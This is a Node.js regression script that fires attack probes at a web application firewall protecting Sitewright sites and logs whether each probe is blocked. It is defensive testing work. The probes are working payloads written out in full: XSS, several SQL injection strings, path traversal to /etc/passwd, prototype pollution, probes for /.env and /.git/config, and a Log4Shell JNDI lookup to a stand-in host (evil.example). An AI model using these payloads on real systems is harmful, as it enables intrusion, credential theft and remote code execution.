// Requests the WAF must KEEP blocking with the Sitewright exclusions loaded: scanners and exploit
// payloads on the public surface. The authoring paths are excluded from the WAF altogether
// (docs/waf/sitewright-before.conf, section 1), so the probes there show what Sitewright itself answers:
// 401, before it reads the body. One row per probe: the status answered (403 = blocked at the WAF).
// usage: node attack-probes.mjs <waf base> <sites domain> <slug> <projectId>
const [WAF, SITES, SLUG, PROJECT] = process.argv.slice(2);
const SITE = `http://${SLUG}.${SITES}:${new URL(WAF).port}`;
const json = (b, h = {}) => ({ method: 'POST', headers: { 'content-type': 'application/json', ...h }, body: JSON.stringify(b) });
const xss = '<script>alert(document.cookie)</script><img src=x onerror=alert(1)>';
const sqli = "1' UNION SELECT username, password FROM users--";
const probes = [
  ['scanner: /.env', `${WAF}/.env`],
  ['scanner: /.git/config', `${WAF}/.git/config`],
  ['scanner: prototype pollution on /', `${WAF}/`, json({ __proto__: { isAdmin: true }, constructor: { prototype: { polluted: 1 } } })],
  ['scanner: Log4Shell in User-Agent', `${WAF}/`, { headers: { 'user-agent': '${jndi:ldap://evil.example/a}' } }],
  ['site page: XSS in the query', `${SITE}/?q=${encodeURIComponent(xss)}`],
  ['site page: path traversal in the query', `${SITE}/?file=../../../../etc/passwd`],
  ['media: path traversal', `${WAF}/media/${SLUG}/..%2f..%2f..%2fetc%2fpasswd`],
  ['form post: SQL injection', `${WAF}/f/${PROJECT}/contact`, json({ name: sqli, email: 'a@example.com', message: 'hi' })],
  ['form post: XSS', `${WAF}/f/${PROJECT}/contact`, json({ name: 'x', email: 'a@example.com', message: xss })],
  ['checkout: SQL injection', `${WAF}/pay/${PROJECT}/shop`, json({ items: [{ sku: sqli, qty: 1 }], fields: {} })],
  ['login: SQL injection in the email', `${WAF}/auth/login`, json({ email: "admin'--", password: "' OR '1'='1" })],
  ['oauth register: XSS in the client name', `${WAF}/oauth/register`, json({ client_name: xss, redirect_uris: ['https://evil.example/cb'] })],
  ['API (path excluded → 401 from Sitewright): XSS page write, no credential', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'home', source: xss }) }],
  ['API (path excluded → 401 from Sitewright): XSS page write, fake credential', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: `Bearer swk_${'0'.repeat(64)}` }, body: JSON.stringify({ id: 'home', source: xss }) }],
  ['API (path excluded → 401 from Sitewright): SQLi in the query, no credential', `${WAF}/projects?search=${encodeURIComponent(sqli)}`],
  ['MCP (path excluded → 401 challenge): XSS tool call, no token', `${WAF}/mcp`, json({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'put_page', arguments: { page: { id: 'x', source: xss } } } })],
  ['MCP (path excluded → 401 challenge): XSS tool call, fake token', `${WAF}/mcp`, json({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'put_page', arguments: { page: { id: 'x', source: xss } } } }, { authorization: `Bearer swk_${'0'.repeat(64)}` })],
  ['upload link (path excluded → 404 from Sitewright): unknown ticket', `${WAF}/media-upload/11111111-2222-3333-4444-555555555555`, { method: 'PUT', headers: { 'content-type': 'application/octet-stream' }, body: 'x'.repeat(1024) }],
];
for (const [label, url, init] of probes) {
  let status;
  try {
    status = (await fetch(url, { redirect: 'manual', ...(init ?? {}) })).status;
  } catch (e) {
    status = `ERR ${e.message}`;
  }
  console.log(`${String(status).padEnd(4)} ${label}`);
}
